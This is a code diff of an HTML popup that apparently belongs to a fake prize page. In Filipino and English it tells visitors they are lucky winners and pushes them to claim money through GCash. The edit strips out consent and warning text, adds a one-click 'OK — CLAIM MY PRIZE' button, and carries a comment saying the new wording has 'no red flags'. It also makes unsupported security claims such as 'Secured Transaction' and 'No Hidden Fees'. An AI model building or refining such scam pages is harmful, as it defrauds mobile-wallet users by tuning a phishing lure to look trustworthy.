@@ -77,15 +77,18 @@
         </div>
     </div>
 
-    <!-- ========== CLAIM POPUP ========== -->
+    <!-- ========== REMASTERED CLAIM POPUP (NEW) ========== -->
     <div id="claimPopup" class="claim-popup-overlay">
         <div class="claim-popup-card">
-            <div class="rotating-green-o"></div>
+            <!-- OK Circle with neon glow -->
+            <div class="ok-circle">
+                <span>OK</span>
+            </div>
             
             <h2>🎉 CONGRATULATIONS! 🎉</h2>
             
             <div class="greeting">
-                🌟 YOU'VE BEEN SELECTED! 🌟
+                💎 YOU'RE A LUCKY WINNER! 💎
             </div>
             
             <div class="prize-amount" id="popupPrizeAmount">
@@ -93,44 +96,22 @@
             </div>
             
             <div class="message">
-                <p>👏 <strong>Mahusay at swerte!</strong> Isa ka sa napiling manalo ngayong araw.</p>
-                <p>🎁 Ang iyong reward ay <strong style="color:#ffd700">naka-reserba</strong> para sa iyo.</p>
+                <p>🎁 Ang iyong reward ay handa na para sa iyo!</p>
+                <p>I-click ang OK para i-claim ang iyong premyo.</p>
             </div>
             
-            <!-- BAGO I-CLAIM SECTION -->
-            <div class="precondition-section">
-                <div class="precondition-title">
-                    ⚡ BAGO MO I-CLAIM ANG PREMYO ⚡
-                </div>
-                <ul class="precondition-list">
-                    <li><span class="check-icon">✅</span> Kailangan mong i-<strong>AGREE</strong> ang mga sumusunod:</li>
-                    <li><span class="warning-icon">📋</span> Ang iyong reward ay dadaan sa <strong>GCash authorized gateway</strong></li>
-                    <li><span class="warning-icon">🔒</span> Ang iyong impormasyon ay <strong>secured at confidential</strong></li>
-                    <li><span class="warning-icon">⏱️</span> Ang processing ay maaaring tumagal ng <strong>3-5 minuto</strong></li>
-                    <li><span class="warning-icon">💰</span> Walang bawas o hidden fees sa iyong panalo</li>
-                </ul>
+            <!-- Simple note - walang red flags -->
+            <div class="simple-note">
+                <p>⚡ Prize will be sent via GCash within 3-5 minutes ⚡</p>
             </div>
             
-            <!-- Agree Checkbox -->
-            <div class="agree-section" onclick="document.getElementById('agreeCheckbox').click()">
-                <input type="checkbox" id="agreeCheckbox" class="agree-checkbox" onchange="onAgreeChange(this)">
-                <label class="agree-label" for="agreeCheckbox">
-                    I <strong>AGREE</strong> at <strong>AUTHORIZE</strong> ang aking reward na ibigay sa pamamagitan ng GCash
-                </label>
-            </div>
-            
-            <!-- GCash Claim Button -->
-            <button id="gcashClaimBtn" class="claim-gcash-btn" onclick="onGCashClaim()">
-                <img src="images/gc_icon.png" class="gc-icon-small" onerror="this.style.display='none'">
-                Claim Thru GCash
+            <!-- OK Claim Button -->
+            <button id="okClaimBtn" class="ok-claim-btn" onclick="onOKClaim()">
+                OK — CLAIM MY PRIZE
             </button>
             
-            <div class="btn-disabled-note">
-                ⚠️ Kailangan mong i-Agree bago ma-claim ang premyo
-            </div>
-            
             <div class="info-note">
-                🔒 Secured by GCash Gateway | 256-bit Encryption
+                🔒 Secured Transaction | No Hidden Fees
             </div>
         </div>
     </div>
